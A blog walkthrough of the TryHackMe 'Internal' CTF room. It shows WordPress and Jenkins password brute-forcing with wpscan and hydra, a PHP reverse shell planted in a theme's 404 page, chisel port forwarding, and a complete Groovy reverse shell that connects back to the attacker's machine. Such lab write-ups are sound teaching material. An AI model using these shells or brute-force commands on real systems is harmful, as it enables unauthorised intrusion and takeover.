<!DOCTYPE html><html lang="en-US" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="TryHackMe - Internal" /><meta name="author" content="Fawaz Masood Qureshi" /><meta property="og:locale" content="en_US" /><meta name="description" content="Intenal is a hard difficulty penetration testing challenge created by TheMayor." /><meta property="og:description" content="Intenal is a hard difficulty penetration testing challenge created by TheMayor." /><link rel="canonical" href="https://thefawsec.github.io/posts/THM-Internal/" /><meta property="og:url" content="https://thefawsec.github.io/posts/THM-Internal/" /><meta property="og:site_name" content="theFawsec" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-04-12T18:00:00+05:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="TryHackMe - Internal" /><meta name="twitter:site" content="@thefawsec" /><meta name="twitter:creator" content="@Fawaz Masood Qureshi" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"Fawaz Masood Qureshi"},"description":"Intenal is a hard difficulty penetration testing challenge created by TheMayor.","url":"https://thefawsec.github.io/posts/THM-Internal/","@type":"BlogPosting","headline":"TryHackMe - Internal","dateModified":"2021-04-12T18:14:21+05:00","datePublished":"2021-04-12T18:00:00+05:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://thefawsec.github.io/posts/THM-Internal/"},"@context":"https://schema.org"}</script><title>TryHackMe - Internal | theFawsec</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/avatars/dp.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">theFawsec</a></div><div class="site-subtitle font-italic">A cyber security enthusiast & aspiring penetration tester, interested in red teaming.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/thefawsec" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/thefawsec" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['fawaz_masood','hotmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="https://www.linkedin.com/in/fawaz-masood-qureshi" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>TryHackMe - Internal</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>TryHackMe - Internal</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Fawaz Masood Qureshi </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Mon, Apr 12, 2021, 6:00 PM +0500" prep="on" > Apr 12 <i class="unloaded">2021-04-12T18:00:00+05:00</i> </span></div><div> <span> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Mon, Apr 12, 2021, 6:14 PM +0500" prefix="Updated " > Apr 12 <i class="unloaded">2021-04-12T18:14:21+05:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="812 words">4 min</span></div></div><div class="post-content"><p><a href="https://tryhackme.com/room/internal">Intenal</a> is a hard difficulty penetration testing challenge created by <a href="https://tryhackme.com/p/TheMayor">TheMayor</a>.</p><h1 id="enumeration">Enumeration</h1><p>Lets start our nmap scan and see what ports are open and what services are running on these ports.</p><h2 id="nmap-scan-result">nmap scan result:</h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre>Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-04-08 19:18 PKT  
Nmap scan report <span class="k">for </span>10.10.94.39 <span class="o">(</span>10.10.94.39<span class="o">)</span>  
Host is up <span class="o">(</span>0.49s latency<span class="o">)</span><span class="nb">.</span>  
  
PORT   STATE SERVICE VERSION  
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>  
| ssh-hostkey:    
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e <span class="o">(</span>RSA<span class="o">)</span>  
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 <span class="o">(</span>ECDSA<span class="o">)</span>  
|<span class="se">\_</span>  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff <span class="o">(</span>ED25519<span class="o">)</span>  
80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>  
|<span class="se">\_</span>http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>  
|<span class="se">\_</span>http-title: Apache2 Ubuntu Default Page: It works  
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux<span class="se">\_</span>kernel  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>  
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>32.28 seconds

</pre></table></code></div></div><p>So we have two ports open, <strong>22</strong> and <strong>80</strong>. Let us first enumerate the content on port 80.</p><h2 id="enumerating-the-port-80">Enumerating the port 80:</h2><p>First thing we can do is to check for any files or directories on the server:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>dirsearch <span class="nt">-u</span> http://10.10.94.39/ <span class="nt">-e</span> php,html,bak <span class="nt">-w</span> /wordlists/directory-list-2.3-medium.txt <span class="nt">-t</span> 100
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/thm-internal/Screenshot_20210408_195726.png" alt="" /></p><p>If we visit the <strong>/blog/</strong> page, we can see it is using wordpress cms. Lets use wpscan:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>wpscan <span class="nt">--url</span> http://10.10.179.3/blog/ <span class="nt">-e</span> u
</pre></table></code></div></div><p>wpscan found a username <strong>admin</strong>. So now we can try to bruteforce the passwords. Hydra can be used, but wpscan can also be used for this purpose:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>wpscan <span class="nt">--url</span> http://10.10.179.3/blog/ <span class="nt">-e</span> u <span class="nt">-t</span> 400 <span class="nt">-P</span> /wordlists/rockyou.txt
</pre></table></code></div></div><p>Found a valid password for user <strong>admin</strong>:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/thm-internal/Screenshot_20210409_173140.png" alt="" /></p><p>So now we can use these credentials and login as admin.</p><p>While checking the admin panel, we see that there are two posts. From which one is private. This post contains some sort of credentials.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/thm-internal/Screenshot_20210409_181146.png" alt="" /></p><p>Hmm! So maybe we can try those on port 22? Unfortunately, it did not work. Seems like a rabbit hole :( Lets continue with the admin panel. Well in the themes section, we can see a theme <strong>twenty seventeen</strong> is installed. Lets edit this one. We have access to mutiple <strong>.php</strong> files. So simply uploading a reverse shell in one file can give us a shell!</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/thm-internal/Screenshot_20210409_182015.png" alt="" /></p><p>I used the following reverse shell from pentestmonkey github repo: <a href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php">Link</a></p><p>After setting up a netcat listener we can browse to non-existing endpoint on the blog so that the 404.php code runs. As soon as we hit the 404.php, we will get a reverse shell:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/thm-internal/Screenshot_20210409_182822.png" alt="" /></p><p>Okay, we are in!</p><h1 id="post-exploitation">Post exploitation</h1><p>We can see a user <code class="language-plaintext highlighter-rouge">aubreanna</code> in the home directory. Doing a little enumeration on the box revealed that there is a jenkins server running locally:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>netstat <span class="nt">-anotp</span>
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/thm-internal/Screenshot_20210409_211849.png" alt="" /></p><p>We can see that port <strong>8080</strong> is open and listening. Now if we list the processes, we will see a java program running (which is jenkins):</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>ps aux
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/thm-internal/Screenshot_20210409_212153.png" alt="" /></p><blockquote><p>Jenkins is a free and open source automation server. It helps automate the parts of software development related to building, testing, and deploying, facilitating continuous integration and continuous delivery.</p></blockquote><p>Googling about jenkins reveals that the default port for jenkins is <strong>8080</strong>.</p><h2 id="port-forward">Port Forward</h2><p>To access the jenkins from our local machine, we’ll need to forward the port. I’ll be using <strong>chisel</strong>.</p><p>First we’ll need to get the chisel binary on the target system. This can be done using a smple python server. Once we have chisel on the target we can start chisel server at target:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>chisel server <span class="nt">-p</span> 6666	<span class="c"># we can choose any random port</span>
</pre></table></code></div></div><p>Then on our local machine:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>chisel client &lt;Target Ip&gt;:6666 9999:127.0.0.1:8080	<span class="c"># 9999 is our local machine's port</span>
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/thm-internal/Screenshot_20210410_194257.png" alt="" /></p><p>Now we’ll be able to access the jenkin from our local machine at the address <strong><code class="language-plaintext highlighter-rouge">127.0.0.1:9999</code>:</strong></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/thm-internal/Screenshot_20210410_194426.png" alt="" /></p><p>I tried the credentials that we found so far but both did not worked. So lets brutforce the login. I’ll be using Hydra here:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>hydra <span class="nt">-l</span> admin <span class="nt">-P</span> /wordlists/rockyou.txt 127.0.0.1 <span class="nt">-s</span> 9999  http-post-form <span class="s1">'/j_acegi_security_check:j_username=admin&amp;j_password=^PASS^&amp;from=%2F&amp;Submit=Sign+in:Invalid+username+or+password'</span>
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/thm-internal/Screenshot_20210410_212228.png" alt="" /></p><p>And we found the password. Using that passowrd we can login as admin in jenkins. Once we are in, we can run groovy script on the jenkins console. I used the following reverse shell written in groovy:</p><div class="language-groovy highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="n">String</span> <span class="n">host</span><span class="o">=</span><span class="s2">"Our-machine-ip"</span><span class="o">;</span>
<span class="kt">int</span> <span class="n">port</span><span class="o">=</span><span class="mi">4444</span><span class="o">;</span>
<span class="n">String</span> <span class="n">cmd</span><span class="o">=</span><span class="s2">"/bin/bash"</span><span class="o">;</span>
<span class="n">Process</span> <span class="n">p</span><span class="o">=</span><span class="k">new</span> <span class="n">ProcessBuilder</span><span class="o">(</span><span class="n">cmd</span><span class="o">).</span><span class="na">redirectErrorStream</span><span class="o">(</span><span class="kc">true</span><span class="o">).</span><span class="na">start</span><span class="o">();</span><span class="n">Socket</span> <span class="n">s</span><span class="o">=</span><span class="k">new</span> <span class="n">Socket</span><span class="o">(</span><span class="n">host</span><span class="o">,</span><span class="n">port</span><span class="o">);</span><span class="n">InputStream</span> <span class="n">pi</span><span class="o">=</span><span class="n">p</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">(),</span><span class="n">pe</span><span class="o">=</span><span class="n">p</span><span class="o">.</span><span class="na">getErrorStream</span><span class="o">(),</span> <span class="n">si</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">();</span><span class="n">OutputStream</span> <span class="n">po</span><span class="o">=</span><span class="n">p</span><span class="o">.</span><span class="na">getOutputStream</span><span class="o">(),</span><span class="n">so</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="na">getOutputStream</span><span class="o">();</span><span class="k">while</span><span class="o">(!</span><span class="n">s</span><span class="o">.</span><span class="na">isClosed</span><span class="o">()){</span><span class="k">while</span><span class="o">(</span><span class="n">pi</span><span class="o">.</span><span class="na">available</span><span class="o">()&gt;</span><span class="mi">0</span><span class="o">)</span><span class="n">so</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">pi</span><span class="o">.</span><span class="na">read</span><span class="o">());</span><span class="k">while</span><span class="o">(</span><span class="n">pe</span><span class="o">.</span><span class="na">available</span><span class="o">()&gt;</span><span class="mi">0</span><span class="o">)</span><span class="n">so</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">pe</span><span class="o">.</span><span class="na">read</span><span class="o">());</span><span class="k">while</span><span class="o">(</span><span class="n">si</span><span class="o">.</span><span class="na">available</span><span class="o">()&gt;</span><span class="mi">0</span><span class="o">)</span><span class="n">po</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">si</span><span class="o">.</span><span class="na">read</span><span class="o">());</span><span class="n">so</span><span class="o">.</span><span class="na">flush</span><span class="o">();</span><span class="n">po</span><span class="o">.</span><span class="na">flush</span><span class="o">();</span><span class="n">Thread</span><span class="o">.</span><span class="na">sleep</span><span class="o">(</span><span class="mi">50</span><span class="o">);</span><span class="k">try</span> <span class="o">{</span><span class="n">p</span><span class="o">.</span><span class="na">exitValue</span><span class="o">();</span><span class="k">break</span><span class="o">;}</span><span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">){}};</span><span class="n">p</span><span class="o">.</span><span class="na">destroy</span><span class="o">();</span><span class="n">s</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/thm-internal/Screenshot_20210410_213433.png" alt="" /></p><p>And we got a shell as user jenkins. Doing a little enumeration reveals that there is a file at <strong><code class="language-plaintext highlighter-rouge">/opt</code></strong> containing credentials for root user:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>jenkins@jenkins:/opt$ cat note.txt
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.

root:PASS-WILL-BE-HERE
</pre></table></code></div></div><p>So we just need to switch user to root or we can ssh into target as root. Whatever you prefer.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/thm-internal/Screenshot_20210410_215257.png" alt="" /></p><p>And the box is finally rooted!</p><p>I hope you enjoyed while reading this walkthrough and learnt something today.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf-walkthroughs/'>CTF-Walkthroughs</a>, <a href='/categories/tryhackme-rooms/'>Tryhackme-Rooms</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a> <a href="/tags/tryhackme/" class="post-tag no-text-decoration" >tryhackme</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=TryHackMe - Internal - theFawsec&url=https://thefawsec.github.io/posts/THM-Internal/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=TryHackMe - Internal - theFawsec&u=https://thefawsec.github.io/posts/THM-Internal/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=TryHackMe - Internal - theFawsec&url=https://thefawsec.github.io/posts/THM-Internal/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://thefawsec.github.io/posts/THM-Internal/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/CTF-Red-BsidesIslamabad-2020/">CTF-Red @ BsidesIslamabad-2020 - Pakistan's first ever Bsides</a><li><a href="/posts/Hacky-Holidays-2020/">Hacky-Holidays. A Tale of Saving The Holidays</a><li><a href="/posts/THM-Internal/">TryHackMe - Internal</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/competition/">competition</a> <a class="post-tag" href="/tags/bsidespakistan/">bsidespakistan</a> <a class="post-tag" href="/tags/hackerone/">hackerone</a> <a class="post-tag" href="/tags/tryhackme/">tryhackme</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/CTF-Red-BsidesIslamabad-2020/"><div class="card-body"> <span class="timeago small" > Nov 16, 2020 <i class="unloaded">2020-11-16T15:00:00+05:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>CTF-Red @ BsidesIslamabad-2020 - Pakistan's first ever Bsides</h3><div class="text-muted small"><p> Assalam-o-Alaikum folks! I hope you guys are safe and sound in this pandemic. BsidesIslamabad-2020 was the first ever Bsides cyber security conference of Pakistan, conducted on November 7th-8th 20...</p></div></div></a></div><div class="card"> <a href="/posts/Hacky-Holidays-2020/"><div class="card-body"> <span class="timeago small" > Jan 15 <i class="unloaded">2021-01-15T21:00:00+05:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hacky-Holidays. A Tale of Saving The Holidays</h3><div class="text-muted small"><p> Assalam-o-Alaikum &amp; Hello Folks! I hope you are doing well. Today I am here with the detailed writeup of a ctf organized by Hackerone which started in 2nd week of December 2020. It was a 12 da...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Hacky-Holidays-2020/" class="btn btn-outline-primary" prompt="Older"><p>Hacky-Holidays. A Tale of Saving The Holidays</p></a> <span class="btn btn-outline-primary disabled" prompt="Newer"><p>-</p></span></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('.post-content img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://twitter.com/thefawsec">Fawaz Masood Qureshi</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/competition/">competition</a> <a class="post-tag" href="/tags/bsidespakistan/">bsidespakistan</a> <a class="post-tag" href="/tags/hackerone/">hackerone</a> <a class="post-tag" href="/tags/tryhackme/">tryhackme</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://thefawsec.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
